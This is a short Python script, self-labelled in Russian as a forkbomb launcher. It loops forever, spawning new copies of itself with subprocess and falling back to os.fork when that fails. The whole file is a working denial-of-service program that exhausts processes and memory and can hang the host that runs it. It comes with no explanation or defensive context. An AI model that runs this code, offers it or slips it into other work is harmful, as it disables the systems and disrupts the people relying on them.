import subprocess
import sys
import os

print("Запуск forkbomb")

while True:
    try:
        subprocess.Popen([sys.executable, __file__])
    except Exception as e:
        if hasattr(os, 'fork'):
            os.fork()
